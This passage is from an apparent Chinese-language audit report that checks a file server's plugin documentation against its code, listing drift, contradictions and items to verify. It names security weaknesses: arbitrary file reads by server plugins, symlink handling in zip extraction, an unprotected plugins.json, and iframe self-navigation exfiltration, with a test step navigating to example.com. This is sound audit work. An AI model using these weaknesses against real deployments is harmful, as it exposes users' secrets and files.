| 不受支持 → `api.plugins.api_version_unsupported` | 一致（该 errorKey 传入 `ManifestError`） | `manifest.js:197-202` | 一致 |
| "将来若支持多版本会在本文与 CHANGELOG 写明兼容区间" | 无多版本逻辑，无兼容分支 | `manifest.js:19` | 一致（未来承诺，无法证伪） |
| mdx/SKILL 说"宿主只认 `1`" | 一致 | 同上 | 一致 |

### 3.3 权限白名单 vs 实际执行

| 文档声明 | 代码实际 | 位置 | 判定 |
|---|---|---|---|
| 白名单 4 个：`fs.read`/`fs.write`/`ui.toast`/`settings.rw` | 一致 | `manifest.js:25-30` | 一致 |
| `SKILL.md:89` 标题"权限（**会被强制执行**）"、表格 `fs.read`→`readText/readBinary`→`requirePerm()` | 一致 | `plugin-frame.tsx:86-90,93,99` | 一致 |
| `fs.write`→`saveText`，**另需** `editFiles` | 一致（宿主 `canWrite` + 服务端 `requirePerm("editFiles")`） | `plugin-frame.tsx:110-111`、`routes/fs.js:1532`、`config.js:252-254` | 一致 |
| `ui.toast`→`notify` | 一致 | `plugin-frame.tsx:125-128` | 一致 |
| `settings.rw` → "后台设置表单 / 已可用" | **无任何执行点**；插件经 `zs:init` 无条件拿到 settings | `manifest.js:29`（仅声明）、`plugin-frame.tsx:150` | **漂移** |
| 不声明就调用 → 宿主直接回 `{ok:false,error:"插件未声明「fs.xxx」权限…"}` | 一致（i18n `zh` 文案 `插件未声明「{perm}」权限，这次操作已被拒绝。…`） | `plugin-frame.tsx:88`、`locales/zh/plugin-preview.json:8` | 一致 |
| `theme` 插件必须一个权限都不申请（否则安装失败） | 一致 | `manifest.js:217-219` | 一致 |
| "插件的能力上限 = 当前登录用户的权限"（`插件开发.md:120`） | 对 fileType 成立；对 server **不成立**（是 OS 用户权限） | `runner.js:102-107` | **漂移**（见下条） |
| `docs/插件开发.md:359` "插件不能读写任意路径"（§11 已知边界） | server 插件可读写任意路径；同段虽补充说明，但与前半句冲突 | `runner.js:102-107` | **漂移** |
| mdx:87-90 `fs.read`/`fs.write`/`ui.toast` 状态="**保留，随 fileType 运行时启用**"、"同上" | 三者**已实现并强制** | `plugin-frame.tsx:93-128` | **漂移**（严重陈旧） |
| mdx:92-93 "`fileType` 插件**将来**跑在 `sandbox="allow-scripts"` 的 iframe 里" | 现在就跑在 | `routes/plugins.js:69-96`、`plugin-frame.tsx:190-199` | **漂移** |
| `docs/安全设计.md:434,446` 同样用"将来跑在 iframe" | 同上 | 同上 | **漂移** |

### 3.4 HTTP 接口：文档端点 vs 实际注册路由

| 文档声明 | 代码实际 | 位置 | 判定 |
|---|---|---|---|
| `GET /api/admin/plugins` 列出 + 总开关状态 | 已注册 | `routes/plugins.js:114-120` | 一致 |
| 该接口**不受**总开关影响（关着也能列） | 路由内无 `ensurePluginsEnabled` | 同上 | 一致 |
| `POST /api/admin/plugins?filename=x.zip`，body 为 zip 原始字节 | 已注册 + `express.raw` | `routes/plugins.js:128-143` | 一致 |
| Content-Type 只接受 `application/zip`、`application/x-zip-compressed`、`application/octet-stream`；HTTP 上限 3 MB | 一致（`limit:"3mb"`） | `routes/plugins.js:130` | 一致 |
| `?filename=` 必须 `.zip` 结尾，否则 400 `not_zip` | 一致 | `store.js:286-288` | 一致 |
| 成功 `201 {ok:true, plugin:{…manifest, sha256, enabled:false}}` | 一致 | `routes/plugins.js:138`、`store.js:334` | 一致 |
| `PATCH /api/admin/plugins/:id` `{enabled?, settings?}`，两字段可同发 | 一致（顺序：先 enabled 后 settings） | `routes/plugins.js:146-163` | 一致 |
| "未启用也能保存设置（启用后生效）" | 一致（`savePluginSettings` 不查 enabled） | `store.js:403-445` | 一致 |
| `POST /api/admin/plugins/:id/theme` `{active:true}`，全局仅一个主题 | 一致 | `routes/plugins.js:166-176`、`store.js:366-384` | 一致 |
| 取消主题另有 `DELETE /api/admin/plugins/theme/active` | 已注册（且 `DELETE /:id` 不会抢先匹配两段路径） | `routes/plugins.js:178-197` | 一致 |
| `DELETE /api/admin/plugins/:id` → 先 `stopPlugin` 再删记录再 `rm -rf` | 一致 | `store.js:386-398` | 一致 |
| `POST /api/admin/plugins/:id/action` `{action, params}` → `{ok:true,data}` | 一致 | `routes/plugins.js:210-233` | 一致 |
| 动作失败表：`400 api.plugins.not_found`（id 不存在） | **404** | `routes/plugins.js:216` | **漂移** |
| 动作失败表：400 `manifest_broken` / `not_enabled` / `not_server` / `action_not_allowed` | 一致 | `routes/plugins.js:217-225` | 一致 |
| `GET /api/plugins/theme` 公开，`{id,name,css}`，无主题时全空 | 一致 | `routes/plugins.js:38-43` | 一致 |
| `GET /api/plugins/list` 公开，只含**已启用**的 `fileType` | 一致（过滤 `kind!=="fileType"`、`enabled`、`manifest` 可读） | `store.js:167-189` | 一致 |
| `http-api.md:189-191` list 项含 `id,name,version,kind,extensions,modes,permissions,settings` | 一致 | `store.js:174-186` | 一致 |
| `mdx:116` list "**仅** id/name/extensions/modes/settings" | 实际还有 `version`/`kind`/`permissions`（`permissions` 恰好是安全关键项） | `store.js:174-186` | **漂移** |
| `GET /api/plugins/entry/:id` 公开，只返回已启用插件的 `entry`，未启用/不存在 404 `not_found` | 一致 | `routes/plugins.js:69-96`、`store.js:192-199` | 一致 |
| 入口响应头 CSP 一字不差（`default-src 'none'` … `sandbox allow-scripts`）+ `nosniff` | 逐字符一致 | `routes/plugins.js:76-89` | 一致 |
| 写请求必须带 `X-Requested-With: XMLHttpRequest`，否则 403 `api.auth.csrf_failed` | 一致 | `auth.js:76-83` | 一致 |
| 会话是 httpOnly Cookie `zs_token`（JWT，默认 72h） | 一致 | `auth.js:8,37-53`、`env.js:149` | 一致 |
| "超管口令在 `.env` 的 `SUPER_ADMIN_PASSWORD`（首次运行自动生成并打印一次）" | 一致 | `env.js:29-31,110-126,292-297` | 一致 |
| `docs/插件开发.md:310-316` 只列 6 条接口（缺 `/list`、`/entry/:id`、`/:id/action`） | 三个都已实现 | `routes/plugins.js:53,69,210` | **漂移**（漏记） |
| 文档未提"`/api/plugins` 三个公开接口都不受总开关约束" | 实际不受约束（`http-api.md:9` 只说了 admin 列表不受影响） | `routes/plugins.js:38-96` | **漂移**（漏记，安全相关） |

### 3.5 kind 名称与语义

| 文档声明 | 代码实际 | 位置 | 判定 |
|---|---|---|---|
| 三种 kind：`theme` / `fileType` / `server`（文档写作 `filetype` 仅出现在文件名） | 集合完全相同，camelCase | `manifest.js:22` | 一致 |
| fileType 的 `extensions` 决定后缀归属；同后缀多插件时按**名称字典序**取第一个 | 一致（`sort(localeCompare)` 后取 `[0]`） | `plugin-registry.ts:63-70` | 一致 |
| `modes: ["edit"]` "表示插件愿意接管编辑（宿主还会看有无 `editFiles`，通过 `canWrite` 告诉你）" | **`matchPlugin` 只被以 `"preview"` 调用**，全站没有 `edit` 调用方；`canWrite` 只看 `editFiles`，与 `modes` 无关 | `preview-page.tsx:86,89` | **漂移**（功能未接线） |
| 内置渲染器优先，插件不能"抢"已有格式 | 一致（`!supported` 才匹配） | `preview-page.tsx:86,301` | 一致 |
| 主题全局同时只有一个生效 | 一致（单一 `activeTheme`） | `store.js:43,366-384` | 一致 |
| `theme.noise` 是"保留字段，当前不改变行为" | 一致（存下但未用） | `manifest.js:172`、`themeCss()` 未引用 | 一致 |

### 3.6 限制常数（体积 / 超时 / 上限）

| 文档声明 | 代码实际 | 位置 | 判定 |
|---|---|---|---|
| zip ≤ 2 MB（HTTP 层 3 MB） | `MAX_PACKAGE_BYTES=2*1024*1024` + raw `limit:"3mb"` | `store.js:32`、`routes/plugins.js:130` | 一致 |
| 解压总量 ≤ 10 MB | `MAX_UNPACKED_BYTES=10*1024*1024` | `store.js:34` | 一致 |
| 条目 ≤ 300 | `MAX_ENTRIES=300` | `store.js:36` | 一致 |
| 单文件（解压后）≤ 2 MB | 用 `MAX_PACKAGE_BYTES` 判单文件 + 二次按 buffer 复核 | `store.js:241,253` | 一致 |
| 已装插件 ≤ 20 | `MAX_PLUGINS=20` | `store.js:38` | 一致 |
| 单动作超时 5 秒、上限 30 秒 | `5000` / `30000`（且下限被夹到 500ms） | `runner.js:32-33,222` | 一致 |
| 启动超时 10 秒 | `READY_TIMEOUT_MS=10000` | `runner.js:35` | 一致 |
| 单行输出 ≤ 256 KB，超出即杀 | `MAX_LINE_BYTES=256*1024`，但判定在拆行前、按字符数 | `runner.js:37,140-144` | **漂移**（语义） |
| 空闲 60 秒回收 | `IDLE_STOP_MS=60*1000`（`unref`） | `runner.js:39,200-206` | 一致 |
| stderr 保留最近 20 行、每行截断 300 字符 | 一致 | `runner.js:41,163-169` | 一致 |
| readText 单文件 ≤ 8 MB，超出 413，二进制 415 | `EDITOR_MAX_BYTES=8MB`，413；`looksBinary` → 415 | `encoding.js:19`、`routes/fs.js:1484,1506-1508` | 一致 |
| readBinary ≤ 16 MB（宿主 `MAX_BINARY_BYTES`） | 一致（但判在 `arrayBuffer()` 之后） | `plugin-frame.tsx:62,106` | 一致 |
| 在线编辑保存上限（文档未提） | `SAVE_FILE_MAX_BYTES=16MB` | `routes/fs.js:1458` | 一致（文档未声明故不算漂移） |
| `permissions` 数组上限（文档未提） | 4（=白名单大小） | `manifest.js:210` | **漂移**（漏记） |

### 3.7 fileType 协议（`kind-filetype.md` / `SKILL.md` §fileType / `插件开发.md` §6）

| 文档声明 | 代码实际 | 位置 | 判定 |
|---|---|---|---|
| `plugin→host {type:"zs:ready"}`，不发就不 init | 一致 | `plugin-frame.tsx:145-156` | 一致 |
| `host→plugin {type:"zs:init", apiVersion, file:{path,name,size,mtime}, settings, canWrite, dark}` | 字段齐全，但 **`size`/`mtime` 恒为 0**（预览页写死 `size={0} mtime={0}`） | `preview-page.tsx:306-307`、`plugin-frame.tsx:146-153` | **漂移** |
| `zs:request {id:number, method, params}`，`id` 必须数字、自己递增 | 一致（`typeof data.id === "number"`） | `plugin-frame.tsx:163` | 一致 |
| 4 个方法：`readText`/`readBinary`/`saveText`/`notify` | 一致，未知方法回 `ok:false` | `plugin-frame.tsx:92-130` | 一致 |
| `readText` 结果字段：`path,name,size,mtime,baseVersion,encoding,encodingConfident,eol,content,softReadOnly,encodings` | 完全一致 | `routes/fs.js:1511-1526` | 一致 |
| `readText` 走 `/api/fs/file`，服务端自动识别编码 | 一致 | `plugin-frame.tsx:94`、`routes/fs.js:1467` | 一致 |
| `readBinary` 返回 `{buffer:ArrayBuffer, mime}`，transfer 零拷贝 | 一致（`transfer: [buffer]`） | `plugin-frame.tsx:107,166` | 一致 |
| `saveText` 结果 `{ok,bytes,encoding,eol}` | 一致 | `routes/fs.js:1621` | 一致 |
| `saveText` 不传 encoding/eol 时沿用最近一次 readText | 一致（`lastText.current` 兜底） | `plugin-frame.tsx:112-119` | 一致 |
| "`baseVersion` **必须**是最近一次 readText 拿到的值" | 缺失也放行（只记 `save_file_without_version` 警告） | `routes/fs.js:1558,1570-1573` | **漂移** |
| 保存成功后版本串变了，必须重新 readText | 一致（宿主主动 `lastText.current = null`，并注释说明） | `plugin-frame.tsx:120-123` | 一致 |
| 保存冲突 → 409 + `code:"VERSION_CONFLICT"`，不静默覆盖 | 一致 | `routes/fs.js:1559-1569` | 一致 |
| `notify` 返回 `null` | 一致 | `plugin-frame.tsx:128` | 一致 |
| 宿主只认 `event.source === iframe.contentWindow`；origin 恒 `"null"` 不可用 | 一致 | `plugin-frame.tsx:139-141,32-33` | 一致 |
| 发 `zs:ready` 两次会收到两次 `zs:init` | 一致（无条件 post） | `plugin-frame.tsx:145-156` | 一致 |
| 插件内**不能** `fetch('/api/...')`、不能加载外部脚本/字体/图片（只 `data:`/`blob:`） | 一致（`script-src 'unsafe-inline'`、`img-src data: blob:`、`connect-src 'none'`），但**可通过自导航外发**（见 S-3） | `routes/plugins.js:78-88` | 一致（有 S-3 保留） |
| 插件内**没有** `document.cookie`（不透明源） | 一致（无 `allow-same-origin`） | `plugin-frame.tsx:195` | 一致 |
| `SKILL.md:110` "插件页面里…整个 UI 与 JS 必须内联在一个 HTML 里" | 一致（`entry` 必须是 `.html`） | `manifest.js:241-243` | 一致 |

### 3.8 server 协议与运行时（`kind-server.md` / `插件开发.md` §7）

| 文档声明 | 代码实际 | 位置 | 判定 |
|---|---|---|---|
| `host→plugin {"type":"init","apiVersion":1,"settings":{}}`，且**恒为 `{}`** | 一致（硬编码） | `runner.js:181` | 一致 |
| `插件开发.md:245` 协议块写 `"settings":{...}`（暗示有值） | 与上面同一条冲突；实际恒 `{}` | `runner.js:181` | **漂移**（自相矛盾） |
| `plugin→host {"type":"ready"}`，10 秒内不给就杀 | 一致 | `runner.js:121-134` | 一致 |
| `host→plugin {"type":"action","id","action","params"}` | 一致 | `runner.js:235` | 一致 |
| `plugin→host {"type":"result","id","ok","data"/"error"}` | 一致（`ok` 真值即 resolve，否则 reject） | `runner.js:190-197` | 一致 |
| `host→plugin {"type":"shutdown"}`（禁用/卸载/退出） | 一致 | `runner.js:245-259`、`store.js:360,389`、`index.js:324` | 一致 |
| 环境变量只有 `PATH Path SystemRoot TEMP TMP TMPDIR LANG LC_ALL` + `ZS_PLUGIN*` | **逐项一致** | `runner.js:44-51` | 一致 |
| "`JWT_SECRET`、`.env` 口令一律不给，但**这只挡环境变量，挡不住读文件**" | 一致，且实测路径可达（S-1） | `runner.js:44-51`、`env.js:158,202` | 一致 |
| 单动作默认 5 秒，**"宿主接口未暴露自定义值"** | 一致（路由从不传 `timeoutMs`） | `routes/plugins.js:228` | 一致 |
| `插件开发.md:234` 超时"5 秒（**可调**，上限 30 秒）" | 无外部可调入口 | `routes/plugins.js:228` | **漂移**（自相矛盾） |
| 超时**直接杀进程**，同进程其它在途动作一起失败 | 一致（`kill` → `rejectAll`） | `runner.js:226-231,60-66` | 一致 |
| 崩溃/退出 → 在途动作 **502 `process_gone`** | 实际 **500** `api.common.server_error` | `runner.js:60-66,171-175`、`index.js:214-221` | **漂移** |
| 进程空闲 60 秒回收 | 一致（`pending.size === 0` 才回收） | `runner.js:200-206` | 一致 |
| 禁用/卸载后立刻回收子进程 | 一致 | `store.js:360` | 一致 |
| stdout 只许一行一 JSON，其余记为噪音（最近 20 行诊断） | 一致（非 JSON 行 push 进 `stderr` 环） | `runner.js:151-157` | 一致 |
| "累积超过 256 KB **未换行**会杀进程" | 判定在拆行前，合法长行同样被杀 | `runner.js:140-144` | **漂移** |
| 调试写 stderr，宿主保留最近 20 行、每行 300 字符 | 一致 | `runner.js:162-169` | 一致 |
| 动作 `id` 由宿主生成、可并发、按 id 配对 | 一致（`inst.seq` + `pending` Map） | `runner.js:114,223-232` | 一致 |
| `entry` 必须是包内 `.js`/`.mjs` | 一致 | `manifest.js:255-257` | 一致 |
| 自测清单"禁用后…日志出现进程退出" | `kill()` 只在 `inst.stderr.length` 非空时写 `plugin_process_exit` → **干净退出无日志** | `runner.js:78-80` | **漂移** |
| 日志文件名 `data/logs/zs-YYYY-MM-DD.log` | 一致（`zs-${key}.log` 且 key 为日期） | `logger.js:14,96` | 一致 |
| 相关事件名 `plugin_install/plugin_toggle/plugin_uninstall/plugin_uninstall_rm/plugin_action/plugin_process_exit` | 全部存在；另有未记入文档的 `plugin_installed` | `store.js:333,361,395,397`、`runner.js:79,278`、`routes/plugins.js:137` | **漂移**（漏记一个） |
| "后台「设置 → 插件」里 server 插件会列出动作按钮，点一下就调用（空 params）" | 一致（`runAction` 发 `params:{}`） | `plugins-section.tsx:148-159,269-286` | 一致 |
| 失败语义"未启用 400 / 动作未声明 400 / 超时 504 / 启动失败 502" | 前三条一致；"启动失败"多为 504 `start_timeout` 或 400 `entry_missing`，502 只在进程已不可用时 | `runner.js:98-113,124,220` | **漂移**（二分） |
| `插件开发.md:361` "`pkg` 打出的单文件 exe 与源码运行行为一致" | `spawn(process.execPath,…)` 在 pkg 下会重启自身而非运行插件脚本（`env.js:5` 已确认打包态存在） | `runner.js:102` | **漂移**（SUSPECTED，需打包验证） |

### 3.9 theme 输出与作用域（`kind-theme.md`）

| 文档声明 | 代码实际 | 位置 | 判定 |
|---|---|---|---|
| 服务端拼 CSS，前端只注入 `<style id="zs-plugin-theme">` + `<html data-theme-plugin="id">` | 一致 | `manifest.js:299-317`、`plugin-theme.ts:15-37` | 一致 |
| 输出形如 `html[data-theme-plugin="id"]{…}` / `….dark{…}` / `… body{font-family:…}` | 逐字符一致 | `manifest.js:302,310-315` | 一致 |
| 特异性 (0,1,1) > `:root`/`.dark` 的 (0,1,0)，所以不需要 `!important` | 一致；`.dark` 挂在 `<html>` 上，暗色块能命中 | `theme-provider.tsx:106,113-114`、"`index.css:105`" | 一致 |
| "只有 `light` 也可以，但暗色模式下会保持默认" | **错**：浅色块 (0,1,1) 会压过 `.dark` (0,1,0)，暗色下仍用浅色值 | `manifest.js:302,311` | **漂移** |
| 值的禁区与长度限制 | 一致 | `manifest.js:54-55` | 一致 |
| "不是白名单 —— 只校验名字格式与值安全性，任何 `--xxx` 都能写" | 一致 | `manifest.js:52` | 一致 |
| 变量名单位置"`web/src/index.css`"，含 `--radius-*`/`--text-*`/`--font-*`/`--sidebar-*`/`--chart-1..5` | 全部存在 | `web/src/index.css:15-65,67-139` | 一致 |
| 应用流程 安装→PATCH→POST theme→刷新 | 一致 | `store.js:348-384`、`plugin-theme.ts:24-37`、`main.tsx:12` | 一致 |
| 主题插件零执行风险（无 JS 通道） | 一致（`kind!=="theme"` 才看 `entry`；无外部 JS 加载） | `manifest.js:234-235` | 一致 |

### 3.10 安装流程、打包与调试（`packaging-and-debug.md`）

| 文档声明 | 代码实际 | 位置 | 判定 |
|---|---|---|---|
| 安装十步（体积→落临时文件→逐条解压→找 manifest→校验→查重→rename→sha256→写状态→清理） | 顺序与内容一致 | `store.js:279-343` | 一致 |
| `manifest.json` 允许在包根或**单一顶层目录** | 一致（根优先，否则遍历一级子目录） | `store.js:261-270` | 一致 |
| 埋在两层以上 → 400 `manifest_missing` | 一致 | `store.js:304` | 一致 |
| 两个各带 manifest 的顶级目录 → 只用一个，另一个丢临时目录 | 一致（`for` 循环内 `return` 第一个命中） | `store.js:264-268` | 一致 |
| `mkdtemp` 在 `data/tmp/plugin-XXXX` | 一致（`TMP_DIR = data/tmp`） | `store.js:295`、`env.js:187` | 一致 |
| "跳过非 File/Directory（**符号链接直接不写**）" | unzipper 从不产出 `SymbolicLink`，符号链接条目被当普通文件写入 | `store.js:233`、`unzipper/lib/Open/directory.js:223` | **漂移** |
| 路径含 `..` / 以 `/` 开头 / 绝对路径 → 400 `zip_slip` | 一致 | `store.js:212-217,234-236` | 一致 |
| "`data/plugins/` 与 `data/plugins.json` 都在 `safety.js` 敏感名单里" | 只有目录在，`plugins.json` **不在** | `safety.js:143-163` | **漂移**（安全，见 S-5） |
| 列表来自"遍历 `data/plugins/` 目录"，所以会出现"目录在、状态没记录" | 一致（`readdirSync` 而非读 `plugins.json`） | `store.js:100-146` | 一致 |
| 该场景"先调安装把它补登记（会 409）" | 一致（`fs.existsSync(PLUGIN_DIR/id)` → 409） | `store.js:322-324` | 一致 |
| 该场景"点卸载报 404" | 一致（`uninstallPlugin` 先查 `state.plugins[id]`） | `store.js:387` | 一致 |
| 手工清理步骤（删目录 + 改 `plugins.json`；JSON 坏会被 integrity 隔离） | 一致（`integrity.js:25` 登记 `plugins.json`） | `integrity.js:25`、`backup.js:25` | 一致 |
| 打包命令 `Compress-Archive -Path "$src\*"`、`zip -r9 …` | 有效命令；仓库**没有**对应的 npm script（文档也没声称有） | `package.json:7-15`、`server/package.json:7-11` | 一致 |
| "脚本/自测：`smoke-test.ps1` 第 17/18/19 组"（`插件开发.md:329`） | 三组均存在且主题吻合 | `smoke-test.ps1:1066,1247,1377` | 一致 |
| `plugin-filetype-entry-sandbox-csp` 断言 `sandbox allow-scripts`/`connect-src 'none'`/`default-src 'none'` | 测试与实现一致 | `smoke-test.ps1:1301` | 一致 |
| 自测清单"未启用时 entry 404 / list 不含" | 一致（且有断言） | `smoke-test.ps1:1282-1286` | 一致 |
| 自测清单"设置越界 400 / 非枚举 400" | 一致（`smoke-test.ps1:1174,1181`） | `store.js:418-437` | 一致 |
| 自测清单"卸载后主题自动恢复默认" | 一致（`uninstallPlugin` 清 `activeTheme`） | `store.js:390-393` | 一致 |
| 自测清单**缺**"权限未声明时被拒"（`kind-filetype.md:299` 有，脚本没有） | 前端行为，脚本无法断言 —— 属正常缺口 | `smoke-test.ps1:1247-1374` | 一致（体例上） |

---

## 四、文档内部矛盾

> 这里只放"两份文档之间/同一文档内部"打架的地方（不含与代码不符，那部分在上表）。

| # | 矛盾 | 位置 |
|---|---|---|
| D-1 | `init.settings` 到底是 `{}` 还是有值：一处写 `"settings":{...}`，另两处强调"目前恒为 `{}`（宿主尚未接线）" | `docs/插件开发.md:245` vs `references/kind-server.md:61-62`、`SKILL.md:115` |
| D-2 | `saveText.baseVersion` 是"**必须**"还是"可选"：`插件开发.md` 的 method 表标 `baseVersion?`，"必须"只出现在 kind-filetype | `docs/插件开发.md:172` vs `references/kind-filetype.md:122` |
| D-3 | 动作超时"**可调**（上限 30 秒）" vs "宿主接口**未暴露**自定义值" | `docs/插件开发.md:234` vs `references/kind-server.md:59` |
| D-4 | 动作"id 不存在"的状态码：一处写 400，另一处写 404 | `references/http-api.md:163` vs `references/manifest.md:134` |
| D-5 | fileType 权限是否已生效：mdx 与安全设计写"保留/将来跑在 iframe"，SKILL 与插件开发写"已可用/会被强制执行" | `mdx:87-94`、`安全设计.md:434,446` vs `SKILL.md:89-98`、`插件开发.md:113-116` |
| D-6 | 文档侧技能对应版本："三种类型都已可用" vs 管理员指南"这一版**只有主题插件完整生效**，fileType/server 要后续版本" | `SKILL.md:34`、`插件开发.md:3` vs `docs/管理员指南.md:658` |
| D-7 | "插件**不获得任何文件权限**" vs "`fs.read`/`fs.write` 已可用" | `docs/管理员指南.md:660-661` vs `docs/插件开发.md:113-114` |
| D-8 | "插件会不会偷偷读我的文件 → **不会**" vs 权限模型允许 fileType 以用户身份读任意可见文件、server 插件可读全盘 | `docs/常见问题.md:230` vs `插件开发.md:113,359`、`runner.js:102-107` |
| D-9 | 接口清单三份不一致：`插件开发.md` 6 条 / mdx 9 条 / `http-api.md` 10 条（含 `DELETE /theme/active`） | `插件开发.md:310-316`、`mdx:110-118`、`http-api.md:50-213` |
| D-10 | `GET /api/plugins/list` 返回字段：mdx 说"仅 id/name/extensions/modes/settings"，http-api.md 列出 `version/kind/permissions` | `mdx:116` vs `http-api.md:188-192` |
| D-11 | `data/plugins.json` 在敏感名单里（两处）vs 代码只有目录；顺带 `docs/管理员指南.md:651` 只提"已纳入备份"，未提敏感名单，三份口径不一 | `packaging-and-debug.md:93`、`开发者指南.md:652` vs `safety.js:143-163` |
| D-12 | 安全设计自述"**三层**设计"，而 mdx 卡片写"插件的**七层**校验" | `安全设计.md:426` vs `mdx:177` |
| D-13 | "只有 light 时暗色模式保持默认" vs 同一文件下面的特异性论证（(0,1,1) > (0,1,0) 会覆盖 `.dark`） | `kind-theme.md:36` vs `kind-theme.md:94-95` |
| D-14 | 总开关语义："关闭时安装/启停/卸载 403"（对）与"已装插件不再生效、主题自动撤销"（错）写在同一个列表里 | `docs/管理员指南.md:610-614`、`docs/配置参考.md:283` |
| D-15 | SKILL 表格把 `settings.rw` 标为"已可用"，但同页又说"插件**不能**读后台设置、`init.settings` 恒 `{}`"（两句话互相否证） | `SKILL.md:96` vs `SKILL.md:115`、`kind-server.md:213` |

---

## 五、疑似待验证

1. **S-3 自导航外泄**必须用真实浏览器验证：`location.href = "https://example.com"` 后，
   `event.source === iframe.contentWindow` 是否仍为真、`zs:init` 是否仍被投递、CSP 是否随文档切换。
   验证要点：Chrome/Edge（`sandbox allow-scripts` 下自导航打不打开弹窗、是否被 `frame-ancestors` 影响）、
   Firefox、Safari 各一次。
2. **pkg 包内的 server 插件**：`build-release.ps1` 打出的 `ZeroShadow.exe` 里跑
   `POST /api/admin/plugins/:id/action` 是否必然 504 `start_timeout`（预期是的，见 S-1 末段）。
   如果是，`插件开发.md:361` 需要改，或 `runner.js` 改成分平台选 `process.execPath` 之外的解释器。
3. **`/api/plugins/list` 的 settings 是否真的"不敏感"**：需要产品决策。若决定保留，
   至少文档要明说"插件设置会在未登录接口暴露，不要放密钥"。
4. **`data/plugins.json` 的可达性**：只需一次实测 —— 把 `FILES_SOFT_DIR` 映射到项目根，
   `GET /api/fs/download?path=<映射名>/data/plugins.json` 的返回码（预期 200，与文档相反）。
5. **总开关关闭时的运行时**：`pluginsEnabled=false` 后
   `GET /api/plugins/list` 是否仍列出、`/api/plugins/entry/:id` 是否仍 200、`GET /api/plugins/theme` 的 `css` 是否非空
   （按代码预期：是/是/是）。这是 S-2 的验证脚本，建议直接加进 `smoke-test.ps1` 第 17 组。
6. **`modes: ["edit"]` 是否真的有消费方**：全仓只有 `preview-page.tsx:86` 一处调用
   `matchPlugin(..., "preview")`，需确认产品是否放弃 edit 模式；若放弃，文档应删掉该字段语义。
7. **`smoke-test.ps1` 未覆盖的三条安全断言**（建议补）：
   ① 总开关关闭后运行时三接口仍可用（当前的"漏洞"）；
   ② 匿名 `/api/plugins/list` 带 `settings`；
   ③ 崩溃在途请求的返回码是 500 而非 502。

---

## 附录：本文用到的关键行号索引

| 主题 | 位置 |
|---|---|
| 子进程 spawn 的全部选项 | `server/src/plugins/runner.js:102-107` |
| 环境变量白名单 | `server/src/plugins/runner.js:44-51` |
| 超时/输出/空闲常数 | `server/src/plugins/runner.js:32-41` |
| 在途动作被拒（无 status → 500） | `server/src/plugins/runner.js:60-66,171-175` |
| 256 KB 判定位置 | `server/src/plugins/runner.js:140-144` |
| 硬编码 `settings: {}` | `server/src/plugins/runner.js:181` |
| manifest 白名单与各正则 | `server/src/plugins/manifest.js:19-59,185-271` |
| 主题 CSS 拼装 | `server/src/plugins/manifest.js:299-317` |
| 解压（zip-slip 防护） | `server/src/plugins/store.js:212-258` |
| 安装主流程 | `server/src/plugins/store.js:279-343` |
| 公开运行时清单（含 settings） | `server/src/plugins/store.js:167-189` |
| 设置服务端校验 | `server/src/plugins/store.js:403-445` |
| 公开路由三条（无总开关检查） | `server/src/routes/plugins.js:38-96` |
| 总开关唯一检查点 | `server/src/routes/plugins.js:106-112` |
| 入口 CSP | `server/src/routes/plugins.js:76-89` |
| admin 守卫挂载 | `server/src/routes/plugins.js:104`、`server/index.js:132` |
| 权限执法点 | `web/src/components/plugins/plugin-frame.tsx:85-130` |
| `postMessage("*")` | `web/src/components/plugins/plugin-frame.tsx:74` |
| iframe 属性 | `web/src/components/plugins/plugin-frame.tsx:190-199` |
| `size/mtime` 写死 0 | `web/src/pages/preview-page.tsx:301-310` |
| 敏感条目集合 | `server/src/safety.js:143-163,213-216` |
| `pluginsEnabled` 默认值 | `server/src/config.js:67` |
| 编辑器读取上限 8 MB | `server/src/encoding.js:19`、`server/src/routes/fs.js:1484` |
| 保存上限 16 MB | `server/src/routes/fs.js:1458` |
| 主题应用（`.dark` 在 html 上） | `web/src/components/theme-provider.tsx:106,113-114` |
| 尺寸/半径等变量定义 | `web/src/index.css:15-65,67-139` |
